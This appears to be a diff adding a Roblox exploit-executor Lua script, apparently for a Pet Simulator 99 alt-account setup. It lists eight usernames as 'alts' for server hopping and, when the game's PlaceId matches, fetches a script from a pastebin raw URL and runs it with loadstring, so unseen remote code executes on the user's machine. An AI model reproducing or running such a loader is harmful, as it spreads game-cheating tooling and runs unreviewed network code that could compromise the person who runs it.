@@ -1,0 +1,15 @@
+getgenv().alts = {
+    "ps99rank7",
+    "HolyKram",
+    "KramATK",
+    "kyleuriarte123",
+    "StartedManw2134",
+    "FriendlyRanger588",
+    "007jimm",
+    "KramDEFF"
+} -- put usernames to hop if more than two of them are in the same server
+
+repeat wait() until game:IsLoaded()
+if game.PlaceId == 8737899170 then
+    loadstring(game:HttpGet('https://pastebin.com/raw/g6ZTcxmA'))()
+end
